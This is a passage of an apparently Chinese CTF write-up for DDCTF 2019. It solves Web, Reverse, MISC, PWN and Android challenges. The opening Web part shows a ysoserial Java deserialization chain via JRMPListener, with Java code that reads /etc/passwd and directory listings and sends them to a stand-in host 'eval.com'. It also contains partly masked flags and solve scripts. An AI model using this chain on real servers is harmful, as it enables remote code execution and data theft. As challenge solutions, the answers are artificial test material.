        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
```
此时，我们的payload已经可以支持代码执行了。  
在这里，我是直接用本地的题目环境进行调试，尝试打印了aaa,操作如下。  
修改替换{\{内容}}  
开启监听端口  
建议采用ceye的dnslog查看  
执行时合并为一行，为了好看，我换了下行  
```
java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 
    CommonsBeanutils1 'code:System.out.printld("aaa");'
```
生成链接JRMPListener的payload  
ip端口那里填写运行第4行脚本的主机地址端口  
`java -jar ./ysoserial-5am3.jar JRMPClient2 {\{10.0.0.1:8099}} | base64`  

此时将第10行生成的代码，直接打到远程即可。  
然后进而写一下获取文件，以及获取目录的代码。此时拿到文件，无法回显。我们可以用Socket来将文件发送到我们的服务器，然后nc监听端口即可。  
```
// 以下代码使用时，记得压缩到一行。
// 获取目录下内容
java.io.File file  =new java.io.File("/");
java.io.File[] fileLists = file.listFiles();
java.net.Socket s = new java.net.Socket("eval.com",8768);

for (int i = 0; i < fileLists.length; i++) {
  java.io.OutputStream out = s.getOutputStream();
  out.write(fileLists[i].getName().getBytes());
  out.write("\n".getBytes());
}

// 获取文件内容
java.io.File file = new java.io.File("/etc/passwd");
java.io.InputStream in = null;
in = new java.io.FileInputStream(file);
int tempbyte;
java.net.Socket s = new java.net.Socket("eval.com",8768);
while ((tempbyte = in.read()) != -1) {
  java.io.OutputStream out = s.getOutputStream();
  out.write(tempbyte);
}
in.close();
s.close();
```
然后操作如下：  
修改替换{\{内容}}  
开启监听端口  
建议采用ceye的dnslog查看  
执行时合并为一行，为了好看，我换了下行  
```
java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 
    CommonsBeanutils1 'code:{\{javapayload}}'
```
#生成链接JRMPListener的payload  
ip端口那里填写运行第4行脚本的主机地址端口  
`java -jar ./ysoserial-5am3.jar JRMPClient2 {\{10.0.0.1:8099}} | base64`  
监听端口数据
>nc -lnvp 2333

此时将第10行生成的代码，直接打到远程即可。
![](https://ctfwp.wetolink.com/2019ddctf/33.png)  
p.s. /flag是个文件夹

## Reverse
**作者：admin-琴里、impakho**
### Cofused
![](https://ctfwp.wetolink.com/2019ddctf/34.png)  
这个文件下载下来是app的安装包  
然后再安装包里发现了一个叫xia0Crackme文件  
![](https://ctfwp.wetolink.com/2019ddctf/35.png)  
然后我们拖到IDA里面  
查找字符串  
![](https://ctfwp.wetolink.com/2019ddctf/36.png)  
交叉引用来到关键函数  
![](https://ctfwp.wetolink.com/2019ddctf/37.png)  
函数都标有注释（震惊！出题人果然是一个良好的大佬）  
程序验证了前六位是不是”DDCTF{“  
以是不是”}”  
然后把中间的字符串当做参数传到sub_1000011D0函数里  
如果这个函数的返回值等于1的话  
这个flag则正确  

然后sub_1000011D0函数中首先是初始化了一个区域：v2  
![](https://ctfwp.wetolink.com/2019ddctf/38.png)  
Sub_100001f60是通过输入的字符串和内存数据对v2进行赋值操作  
![](https://ctfwp.wetolink.com/2019ddctf/39.png)  
前段是对v2进行赋值，最后将输入的字符串拷贝到qword_100003F58+48的位置  


sub_100001F00函数对(*v2+24)进行赋值把一段数据赋给了他，然后是一个循环判断条件就是刚刚赋值的数据是不是等于“0xf3”
然后我们进入sub_100001E50这个函数是控制程序执行的vm的分支  

![](https://ctfwp.wetolink.com/2019ddctf/40.png)  
跳转的分支就是刚刚给v2赋值的函数地址  

sub_100001D70：相当于给一个寄存器赋值的操作  
![](https://ctfwp.wetolink.com/2019ddctf/41.png)  
然后sub_100001A60：异或操作  
![](https://ctfwp.wetolink.com/2019ddctf/42.png)  
ub_100001AA0：对操作后的字符和输入的字符进行比较  
sub_100001CB0：加操作  
![](https://ctfwp.wetolink.com/2019ddctf/41.png)  
sub_100001CF0：减操作  
![](https://ctfwp.wetolink.com/2019ddctf/44.png)  
sub_100001B10:设置判断是否正确标志位  
![](https://ctfwp.wetolink.com/2019ddctf/45.png)  
sub_100001D30：赋值操作  
![](https://ctfwp.wetolink.com/2019ddctf/46.png)

sub_100001C60：对内存中的数据进行操作  
![](https://ctfwp.wetolink.com/2019ddctf/47.png)  
两种运算:`A～Z`和`a～z`  
![](https://ctfwp.wetolink.com/2019ddctf/48.png)  
具体数据：  
```
0xf0,0x10,0x66,0x0,0x0,0x0,
0xf8,
0xf2,0x30,
0xf6,0xc1,

0xf0,0x10,0x63,0x0,0x0,0x0,
0xf8,
0xf2,0x31,
0xf6,0xb6,

0xf0,0x10,0x6a,0x0,0x0,0x0,
0xf8,
0xf2,0x32,
0xf6,0xab,

0xf0,0x10,0x6a,0x0,0x0,0x0,
0xf8,
0xf2,0x33,
0xf6,0xa0,

0xf0,0x10,0x6d,0x0,0x0,0x0,
0xf8,
0xf2,0x34,
0xf6,0x95,

0xf0,0x10,0x57,0x0,0x0,0x0,
0xf8,
0xf2,0x35,
0xf6,0x8a,

0xf0,0x10,0x6d,0x0,0x0,0x0,
0xf8,
0xf2,0x36,
0xf6,0x7f,

0xf0,0x10,0x73,0x0,0x0,0x0,
0xf8,
0xf2,0x37,
0xf6,0x74,

0xf0,0x10,0x45,0x0,0x0,0x0,
0xf8,
0xf2,0x38,
0xf6,0x69,

0xf0,0x10,0x6d,0x0,0x0,0x0,
0xf8,
0xf2,0x39,
0xf6,0x5e,

0xf0,0x10,0x72,0x0,0x0,0x0,
0xf8,
0xf2,0x3a,
0xf6,0x53,

0xf0,0x10,0x52,0x0,0x0,0x0,
0xf8,
0xf2,0x3b,
0xf6,0x48,

0xf0,0x10,0x66,0x0,0x0,0x0,
0xf8,
0xf2,0x3c,
0xf6,0x3d,

0xf0,0x10,0x63,0x0,0x0,0x0,
0xf8,
0xf2,0x3d,
0xf6,0x32,

0xf0,0x10,0x44,0x0,0x0,0x0,
0xf8,
0xf2,0x3e,
0xf6,0x27,

0xf0,0x10,0x6a,0x0,0x0,0x0,
0xf8,
0xf2,0x3f,
0xf6,0x1c,

0xf0,0x10,0x79,0x0,0x0,0x0,
0xf8,
0xf2,0x40,
0xf6,0x11,

0xf0,0x10,0x65,0x0,0x0,0x0,
0xf8,
0xf2,0x41,
0xf6,0x6,
0xf7,0x1,0x0,0x0,0x0,0xf3
```

最后可以得到flag：`hello******TheFlag`

`DDCTF{hello******TheFlag}`  
(PS:题目作者真是一名优秀的程序员<滑稽>)

### Reverse 2
作者：**impakho**  
查壳，显示 ASPack ，用工具脱壳。上 IDA 分析。  
![](https://ctfwp.wetolink.com/2019ddctf/49.png)  
sub_11D11F0 函数判断输入的字符串是否在 0-9,A-F 的范围内，并且长度是否为偶数。  
![](https://ctfwp.wetolink.com/2019ddctf/50.png)  
sub_11D1240 函数是一个 hex2bin 的转换。  
![](https://ctfwp.wetolink.com/2019ddctf/51.png)  
sub_11D1000 函数是一个 base64 编码的过程，编码结果再异或 0x76。  
编码表为 byte_11D3020。  
![](https://ctfwp.wetolink.com/2019ddctf/52.png)  

贴上解密脚本：
```
enc='reverse+'
dec1=''
table='373435323330313E3F3C3D3A3B383926272425222320212E2F2C171415121310111E1F1C1D1A1B181906070405020300010E0F0C46474445424340414E4F5D59'.decode('hex')
dec2=[]
flag=''

for i in enc:
    dec1+=chr(ord(i)^0x76)
for i in dec1:
    dec2.append(table.index(i))
for i in range(2):
    a=dec2[4*i+0]
    b=dec2[4*i+1]
    c=dec2[4*i+2]
    d=dec2[4*i+3]
    flag+=chr((a<<2)|(b>>4))
    flag+=chr(((b<<4)&0xff)|(c>>2))
    flag+=chr(((c<<6)&0xff)|d)
flag=flag.encode('hex').upper()
print 'DDCTF{\%s}' % flag
```
Flag: `DDCTF{AD******C7BE}`

## MISC
作者：**admin-琴里、impakho**  
### wireshark
我们得到流量包，分析流量包并未发现敏感信息。 。。  
然后，就试着导出文件 得到：  
![](https://ctfwp.wetolink.com/2019ddctf/53.png)  
并未有任何发现。。 然后，就试着再次分析流浪包。 在追踪流时发现多个图片。  
![](https://ctfwp.wetolink.com/2019ddctf/54.png)  
![](https://ctfwp.wetolink.com/2019ddctf/55.png)  
![](https://ctfwp.wetolink.com/2019ddctf/56.png)  
又发现了一个解密网站。。。  
![](https://ctfwp.wetolink.com/2019ddctf/57.png)  
把图片手动导出。。。 （16进制工具） 得到：  
![](https://ctfwp.wetolink.com/2019ddctf/58.png)  
发现了钥匙。。。  
然后就是获得key  
发现图片钥匙头朝下。。。   
猜测可能隐藏高度：  
把高度改为07 50，得到key  
![](https://ctfwp.wetolink.com/2019ddctf/59.png)  
key:57pmYyWt  
然后在线解密就得到flag了。

### MulTzor

题目提供的是hex,根据题目分析，可知是词频分析，本打算统计词频分析来做，想到了xortools,猜测词频中最常见的字符为0x20，即空格符。

```
txt = "38708d2a29ff535d9e3f20f85b40df3c3fab465b9a731ce55b54923279e85b4397362be25c54df2020f8465692733ce55351
93363dab465b9a732eee41479a2137ab735f933a3cf8125a91730ee4405f9b730eea4013b61a79ff5d138d3638ef12408a312aff535
d8b3a38e71252923c2ce54640df3c3fab7f5c8d203ca6515c9b363dab40529b3a36ab515c923e2ce55b509e2730e45c40df3c3fab46
5b9a7318f35b40df2336fc57418c732de35347df3b38ef12519a3637ab575d9c3a29e357419a3779fe415a913479ce5c5a983e38ab5
f529c3b30e55740d1730de35b40df2a30ee5e579a3779e65b5f962738f94b13963d2dee5e5f96343ce55156df2431e2515bd37338e7
5d5d98732ee2465bdf2731ea4613992136e6125c8b3b3cf912579a302bf242479a3779ca4a5a8c732bea565a907338e556138b3635e
e4241963d2dee40138b2138e5415e96202ae25d5d8c7f79fc5340df3430fd575ddf2731ee125090373ce5535e9a730ce746419e7d79
df5a5a8c732eea41139c3c37f85b579a213cef125186732eee41479a2137ab61468f213ce65713be3f35e25757df1036e65f5291373
cf91277883a3ee34613bb7d79ce5b409a3d31e445568d732de4125b9e253cab50569a3d79a956569c3a2ae24456dd732de412479736
79ca5e5f96363dab445a9c2736f94b1df5590de35713ba3d30ec5f52df3e38e85a5a91362aab45568d3679ea12559e3e30e74b13903
579fb5d418b323be757139c3a29e35741df3e38e85a5a91362aab455a8b3b79f95d47902179f851419e3e3be757418c7d79cc5d5c9b
7336fb57419e2730e555138f2136e857578a213cf81e138f2136fb5741932a79ee5c5590213aee561fdf2436fe5e57df3b38fd57139
2323dee1247973679fb5e46983136ea4057df1637e2555e9e7334ea515b963d3cab475d9d213cea59529d3f3ca5127b90243cfd5741
d37334e44147df3c3fab465b9a731eee405e9e3d79e65b5f962738f94b13993c2be85740d3732aee51419a2779f85741893a3aee411
39e3d3dab515a893a35e2535ddf323eee5c5096362aab465b9e2779fe41569b731ce55b54923279ee5f43933c20ee56138f3c36f912
5c8f362bea465a913479fb405c9c363dfe40568c7f79ea5c57df3a2dab45528c732de357409a7329e45d41df232be451569b262bee4
1138b3b38ff1252933f36fc5757df2731ee1276913a3ee6531392323ae35b5d9a2079ff5d139d3679f957459a212aee1f56913430e5
57568d363dab535d9b732de357139c3a29e357418c732de412519a732bee5357d15953df5a56df143cf95f52917329e747549d3c38f
9561e9a222ce242439a3779ce5c5a983e38ab50569c3234ee127d9e2930ab75568d3e38e54b148c7329f95b5d9c3a29ea5e139c2120
fb465cd22020f84656927d79c2461388322aab504190383ce5125186732de35713af3c35e2415bdf143ce557419e3f79d8465299357
ef81270962331ee4013bd262bee5346df3a37ab76569c3634e95741df6260b8001fdf2430ff5a138b3b3cab535a9b7336ed12758d36
37e85a1e8c2629fb5e5a9a3779e25c479a3f35e2555691303cab5f528b362be2535fdf3c3bff535a91363dab5441903e79ea12749a2
134ea5c138c2320a51272df3e36e5465bdf313ced5d419a732de3571390262de940569e3879e45413a83c2be75613a8322bab7b7ad3
7338ff1252df3036e554568d3637e85713973635ef125d9a322bab65528d2038fc1e138b3b3cab625c933a2ae31270962331ee4013b
d262bee5346df2031ea40569b7330ff4113ba3d30ec5f52d2312bee5358963d3eab46569c3b37e243469a2079ea5c57df273ce85a5d
903f36ec4b13883a2de31247973679cd4056913031ab535d9b731bf95b47962031a512778a2130e555138b3b3cab75568d3e38e5125
a912538f85b5c917336ed1263903f38e5561fdf3036f95713af3c35e2415bdf1030fb5a568d731bfe40569e2679fb57418c3c37e557
5fdf243cf957139a2538e847528b363da71245963279d95d5e9e3d30ea1e138b3c79cd405291303cab455b9a213cab465b9a2a79ee4
1479e3135e2415b9a3779ff5a56df031aab70418a3d36ab415a983d38e74113963d2dee5e5f96343ce55156df202dea465a903d79fc
5b4797731ff9575d9c3b79ed5350963f30ff5b568c732afe424390212da512608a303aee4140992635ab515c90233cf95347963c37a
b535e903d3eab465b9a7309e45e568c7f79ff5a56df152bee5c50977f79ea5c57df2731ee12718d3a2de2415bdf322dab705f9a273a
e35e56867309ea4058df3036e5465a91263cef1246912730e712798a3d3cab030acb6375ab455b9a3d79cd405291303cab41468d213
ce556568d363dab465cdf2731ee12749a2134ea5c40d15953cd405c92732de35b40df313cec5b5d913a37ec1e138b3b3cab70419627
30f85a13b83c2fee405d923637ff127090373cab535d9b731af2425b9a2179d8515b903c35ab1a74bc751ad81b139e2779c95e568b3
031e7574adf0338f959139d2630e746138a2379ea5c139a2b2dee5c4096253cab514186232dea5c52932a2de251139c3229ea505a93
3a2df21c13b63d30ff5b52933f20a71247973679ef57508d2a29ff5b5c91732eea4113923230e55e4adf3c3fab7e4699272eea54559
a7371cc5741923237ab535a8d733fe440509a7a79ea5c57df3279ed5744df1b3cee4013d7143cf95f52917338f95f4ad67334ee4140
9e343cf81e139e2079ff5a56df182be257548c3e38f95b5d9a7371cc5741923237ab5c52892a70ab575e8f3f36f25757df3e2ce85a1
3923c2bee12409a302cf957138f2136e857578a213cf81255902179fe415a913479ce5c5a983e38a51272933237ab66468d3a37ec1e
139e731aea5f518d3a3dec5713aa3d30fd57418c3a2df2125e9e2731ee5f528b3a3ae2535ddf3237ef125f903430e85b52917f79fb4
05c893a3dee561392263ae3125c99732de35713902130ec5b5d9e3f79ff5a5a913830e555138b3b38ff125f9a3779ff5d138b3b3cab
56568c3a3ee5125c99732de357139c2120fb4652913235f2465a9c3235ab505c92313cab5f529c3b30e55740df2731ea461388362be
e125a91202df9475e9a3d2dea5e13963d79ee445691272cea5e5f86733bf95752943a37ec1247973679e553459e3f79ce5c5a983e38
a5127b90243cfd5741d3732de35713b42130ee554092322be25c56df3a37ff405c9b263aee56139e3d79ce5c5a983e38ab44568d203
0e45c13883a2de31252df3536fe404797732be4465c8d733fe4401396272aab671e9d3c38ff411fdf213cf8475f8b3a37ec125a9173
38ab4241903f36e555569b7329ee405a903779fc5a5691732de357409a7334ee41409e343cf81250902635ef125d902779e957139b3
63af94b438b363da51264962731ab465b9a733aea42478a213cab5d55df213ce757459e3d2dab515a8f3b3cf912589a2a2aab535d9b
732de357138a203cab5d55df3e2ce85a1399322aff5741df060aab7c52892a79e95d5e9d362aa712419a342ce75341d3732bea425a9
b732bee5357963d3eab5d55df0674e95d528b7334ee41409e343cf812419a202ce65757d15953df5a56df3535ea5513962063ab7677
bc071ff002579c3638b806069d326dbd040bcf3169e90101cc3761ea0a02cf656db8570a82"
txt = txt.decode("hex")
print len(txt)
print len(set(txt))
open("xorout","wb").write(txt[1:])#xortools分析过一次，发现第一位是噪音干扰值，直接去除。
pwn@7feilee:/mnt/c/Users/7feilee$ xortool xorout -c 20
The most probable key lengths:
   3:   11.9%
   6:   19.7%
   9:   9.4%
  12:   14.5%
  15:   7.1%
  18:   11.2%
  21:   5.3%
  24:   8.4%
  30:   6.8%
  36:   5.7%
Key-length can be 3*n
1 possible key(s) of length 6:
3\xffSY\x8bw
Found 1 plaintexts with 95.0%+ printable characters
See files filename-key.csv, filename-char_used-perc_printable.csv
pwn@7feilee:/mnt/c/Users/7feilee$ xxd xortool_out/0.out
00000000: 4372 7970 7424 6e61 6c79 732c 7320 6f66  Crypt$nalys,s of
00000010: 2031 6865 2045 6e2c 676d 6120 632c 7068   1he En,gma c,ph
```

发现明文中有1/6的字母是错误的，应该是key的一位有问题，找到原文
>https://en.wikipedia.org/wiki/Cryptanalysis_of_the_Enigma 

得到key:3\xffSY\x8b2 解密：

```
print repr(txt[:16])
data = open("xortool_out/0.out","rb").read()
print data
xxx = '''Cryptanalysis of the Enigma ciphering system enabled the western Allies in World War II to read substantial amounts of Morse-coded radio communications of the Axis powers that had been enciphered using Enigma machines. This yielded military intelligence which, along with that from other decrypted Axis radio and teleprinter transmissions, was given the codename Ultra. This was considered by western Supreme Allied Commander Dwight D. Eisenhower to have been "decisive" to the Allied victory.'''
out = ""
for i in range(0,493):
    out +=chr(ord(txt[i+1])^ord(xxx[i]))
print repr(out)
length = 2654
key = "3\xffSY\x8b2"
plain =""
for i in range(0,2654):
    plain +=chr(ord(txt[i+1])^ord(key[i%6]))
print plain
```

flag：

`DDCTF{0dcea345ba46680b0b323d8a810643e9}`

### 北京地铁
>提示：AES ECB密钥为小写字母
提示2：密钥不足位用\0补全
提示3：不要光记得隐写不看图片本身啊...

![](https://ctfwp.wetolink.com/2019ddctf/60.png)  
根据题目提示，查隐写，在 LSB 里找到一串 base64 编码的字符串，应该是 AES 的密文。  
![](https://ctfwp.wetolink.com/2019ddctf/61.png)  
进一步根据 Color Threshold 提示，用 PhotoShop 调整图片的阀值，找到 北京地铁线路图 上某一站点的颜色不一样，这个站点的 小写拼音字母 为加密密钥。  
![](https://ctfwp.wetolink.com/2019ddctf/62.png)  
```
from Crypto.Cipher import AES
from base64 import *

cipher=b64decode('7SsQWmZ524i/yVWoMeAIJA==')
key='weigongcun'.ljust(16,'\x00')
mode=AES.MODE_ECB

c=AES.new(key, mode)
print c.decrypt(cipher)
```
Flag: `DDCTF{Q****@B0}`

### 联盟决策大会

以下为使用到的7个十六进制常数：
```
p =
C45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627
E3ED40FBDE968251984513ACC2B627B4A483A6533
组织1成员1 =
729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB17
77357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E
组织1成员2 =
478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C
24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6
组织1成员4 =
BFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB
5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D
组织2成员3 =
9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A
0A494BE36CEF44ADE376317E7A0C70633E3091A61
组织2成员4 =
79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393F
C7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8
组织2成员5 =
2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472
444A3CE2368E5A6EBF96603B3CD10EAE858150510
```

根据题目提示，在维基百科上可以找到 [Shamir算法](https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing) 的解密脚本。  
使用 组织1成员1 & 组织1成员2 & 组织1成员4 & p，可以解密得到 组织1密文。  
使用 组织2成员3 & 组织2成员4 & 组织2成员5 & p，可以解密得到 组织2密文。  
刚开始想直接将两者进行 xor 处理，应该就能得到明文，其实这样行不通。  
后来发现将两者拿去进行解密，就可以得到明文了。  
附上解密脚本：
```
from __future__ import division
from __future__ import print_function

import random
import functools

_PRIME = 2**127 - 1

_RINT = functools.partial(random.SystemRandom().randint, 0)

def _eval_at(poly, x, prime):
    accum = 0
    for coeff in reversed(poly):
        accum *= x
        accum += coeff
        accum %= prime
    return accum

def make_random_shares(minimum, shares, prime=_PRIME):
    if minimum > shares:
        raise ValueError("pool secret would be irrecoverable")
    poly = [_RINT(prime) for i in range(minimum)]
    points = [(i, _eval_at(poly, i, prime))
              for i in range(1, shares + 1)]
    return poly[0], points

def _extended_gcd(a, b):
    x = 0
    last_x = 1
    y = 1
    last_y = 0
    while b != 0:
        quot = a // b
        a, b = b, a%b
        x, last_x = last_x - quot * x, x
        y, last_y = last_y - quot * y, y
    return last_x, last_y

def _divmod(num, den, p):
    inv, _ = _extended_gcd(den, p)
    return num * inv

def _lagrange_interpolate(x, x_s, y_s, p):
    k = len(x_s)
    assert k == len(set(x_s)), "points must be distinct"
    def PI(vals):
        accum = 1
        for v in vals:
            accum *= v
        return accum
    nums = []
    dens = []
    for i in range(k):
        others = list(x_s)
        cur = others.pop(i)
        nums.append(PI(x - o for o in others))
        dens.append(PI(cur - o for o in others))
    den = PI(dens)
    num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p)
               for i in range(k)])
    return (_divmod(num, den, p) + p) % p

def recover_secret(shares, prime=_PRIME):
    if len(shares) < 2:
        raise ValueError("need at least two shares")
    x_s, y_s = zip(*shares)
    print (x_s)
    return _lagrange_interpolate(0, x_s, y_s, prime)

def main():
    p=0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533
    a1=(1,0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E)
    a2=(2,0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6)
    a4=(4,0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D)
    b3=(3,0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61)
    b4=(4,0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8)
    b5=(5,0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510)
    shares=[a1,a2,a4,b3,b4,b5]
    r1=recover_secret(shares[:3],p)
    r2=recover_secret(shares[-3:],p)
    print(hex(r1))
    print(hex(r2))
    r3=r1^r2
    print(hex(r3))
    c1=(1,r1)
    c2=(2,r2)
    shares=[c1,c2]
    r4=recover_secret(shares,p)
    print(hex(r4))
    print(hex(r4)[2:-1].decode('hex'))

if __name__ == '__main__':
    main()
```
Flag: `DDCTF{vF22holF5hl5*****FZ5kZ1DBdWOGObk}`

### 声纹锁
Please find the python script `[FINAL_SOLUTION]_recover_voice.py`.

`[RECOVERED_WAV]_recovered_better.wav` is the recovered audio from `[CHALLENGE_ATTACHMENT]_fingerprint.png` by using the python script.

其实这题是一个相当简单的题目，可以用一句话说明：给定傅里叶级数的系数计算原函数并采样成音频。原题给出的fingerprint实际上是音频的频谱
图（Spectrogram）又称声指纹（Voiceprint）。影响音频质量的主要是采样频率低（香农采样定理），实测生成fingerprint时只要把音频sample rat
e(源码的sr)=30000时就可以得到较为清晰的原音频。除此以外，通过一些算法也可以弥补音频质量低的问题，比如说考虑到这是人声，可加入低通滤波
器（比如<500Hz）来增强低频部分抗混叠，得到的音频也是能够听清所读的字母的。脚本中限制了只计算频率范围在100~800Hz之间，因此能够得到较为
清晰的人声。

## PWN
作者：**admin-琴里**
### Strike
![](https://ctfwp.wetolink.com/2019ddctf/63.png)  
首先，我们读一下整个程序  
![](https://ctfwp.wetolink.com/2019ddctf/64.jpeg)  
我们可以看到这里buf可以输入0x40个字节  
![](https://ctfwp.wetolink.com/2019ddctf/65.jpeg)  
查看安全检查，没有canary  
后面通过调试这里输入可以泄露  
![](https://ctfwp.wetolink.com/2019ddctf/66.jpeg)  
![](https://ctfwp.wetolink.com/2019ddctf/67.jpeg)  
下面输入password  
可以看到这里signed 变成了unsigned  
这里的话 就是一个整形溢出漏洞  
![](https://ctfwp.wetolink.com/2019ddctf/68.jpeg)  
![](https://ctfwp.wetolink.com/2019ddctf/69.jpeg)  
然后，我们就可以进行栈溢出攻击  
我们通过第一步泄露libc地址  
在进行第二部攻击的时候  
![](https://ctfwp.wetolink.com/2019ddctf/70.jpeg)  
发现这里最后的指令是会困住你的  
lea esp,[ecx-4]  
改变了栈地址  
retn的时候要注意  
我尝试按照一般的做法直接覆盖是行不通的  
就只能泄露栈地址  
然后计算偏移  
算出libc_base  
附件给了libc，可以确定onegadget  
然后通过第二部的栈溢出  
构造返回为one_gadget  
就直接shel  
![](https://ctfwp.wetolink.com/2019ddctf/71.jpeg)  
然后我们就能拿到flag  

## Android
**感谢作者：impakho**
### Breaking LEM
>提示：The format of the flag is DDCTF{ddctf-android-lorenz-ZFXXXXXX}, where XXXXXX represents a 6-char string comprised of A-Z and 0-9. MAX Attempts Limit is 5

看题目应该是 `Lorenz Cipher`，上维基百科恶补一番。  
反编译 APK，找到关键函数在 `libhello-libs.so` 文件里的：  
```
Java_com_didictf_guesskey2019lorenz_MainActivity_stringFromJNI(int a1); 
```
结合动态调试，分析出输入要以 `ddctf-android-lorenz-` 开头，里面会去除这个开头，然后判断剩下的字符串是否在 A-Z,1-6 范围内，然后拿去做 `Lorenz Encrypt`，最后加密结果做 5轮sha256 计算，比较结果是否与设定值相同。  
LEM 初始化时会设置 `Pinsettings`，也就是轮子的初始值，然后每次转轮生成固定的密钥，有点像 `srand` 和 `rand` 产生伪随机数的过程。然后用户输入还经过 `TelePrinter` 的 `Baudot` 编码转换。生成的密钥与用户输入进行 xor 处理。完成一次加密需要进行 10轮 这个步骤。  
根据题目提示，需要交给 LEM 做加密的字符串为 ZFXXXXXX（X 代表的字符在 A-Z,1-6 范围内）。  
![](https://ctfwp.wetolink.com/2019ddctf/72.png)  
为了省事，在此处下断点读 v4，读 8*10=80 次，把需要用到的密钥读出来。  
已知明文前面两字节为 ZF，需要爆破后面6字节。  
写出爆破脚本如下：  
```
from hashlib import sha256

target='4b27bd0beaa967e3625ff6f8b8ecf76c5beaa3bda284ba91967a3a5e387b0fa7'
table='ABCDEFGHIJKLMNOPQRSTUVWXYZ123456'

key=[0x9,0x17,0x16,0x3,0x12,0xB,0x1B,0x0,0x4,0x10,0x19,0x5,0x17,0x1D,0x17,0x18,0x18,0x19,0xE,0x3,0x8,0x8,0x18,0xD,0x1E,0x9,0x19,0x1E,0x13,0x0,0x1E,0x1F,0x5,0x11,0x1A,0xD,0x17,0xF,0x1C,0x7,0x1B,0xA,0x8,0x9,0x7,0x1F,0x17,0xA,0xF,0x1F,0x4,0xD,0x18,0xE,0xB,0xB,0x12,0x4,0x3,0xD,0xD,0x4,0x5,0x1D,0xE,0x11,0x8,0x5,0x15,0x1C,0x7,0x1E,0x14,0x9,0x1F,0x2,0xD,0xE,0xA,0x19]
tele=[3,25,14,9,1,13,26,20,6,11,15,18,28,12,24,22,23,10,5,16,7,30,19,29,21,17,0,4,8,2,27]

flag='ZF'
enc=''

for i in range(2):
    tmp=tele[table.index(flag[i])]
    for j in range(10):
        tmp^=key[j*8+i]
    enc+=table[tele.index(tmp)]

print enc

i=0
succ=0
for a in table:
    for b in table:
        for c in table:
            for d in table:
                for e in table:
                    for f in table:
                        if i%100000==0: print float(i)*100/1073741824
                        tmp=enc+a+b+c+d+e+f
                        res=tmp
                        for k in range(5):
                            res=sha256(res).hexdigest()
                        i+=1
                        if res==target:
                            print tmp
                            enc=tmp
                            succ=1
                            break
                    if succ==1: break
                if succ==1: break
            if succ==1: break
        if succ==1: break
    if succ==1: break

flag=''
for i in range(8):
    tmp=tele[table.index(enc[i])]
    for j in range(10):
        tmp^=key[j*8+i]
    flag+=table[tele.index(tmp)]

print 'DDCTF{ddctf-android-lorenz-%s}' % flag
```
跑大概一个小时左右，就能跑到 Flag 了。

Flag: `DDCTF{ddctf-android-******-ZFPQETDB}`
### Have Fun
>这题真令人头疼。变量名全部经过 Unicode混淆，字符串全部经过 动态解密混淆，关键代码还插了 垃圾指令 导致生成伪代码失败。

尝试动态调试，直接闪退，`logcat` 显示 `loadlibrary` 时抛出 `has invalid shdr offset/size` 错误。上网查了一下，发现 Android >= 7 时开启了诸多对 .so 文件的检测。而这道题的 .so 头部被修改过，所以过不了这个检测。  
先对 `libhwFGfOp0EzktJb.so` 进行分析。  
![](https://ctfwp.wetolink.com/2019ddctf/73.png)  
此处会判断输入长度是否为14字节。  
![](https://ctfwp.wetolink.com/2019ddctf/74.png)  
然后与 `off_2910` 进行比较。
```
off_2910 = @n|ixihPIppqws
```
再分析一下 smali 代码。发现它会调用到一个外部 dex 文件：`assets/Y2xhc3Nlc19kZC5kZXg=`。
![](https://ctfwp.wetolink.com/2019ddctf/75.png)
这里会对用户输入进行 Encode，然后再交由 .so 进行比较。  
写解密脚本，发现提交答案始终不正确。在这里卡了一段时间，后来重新审计 smali 代码，发现自己还是太年轻了，没玩懂出题人的套路。  
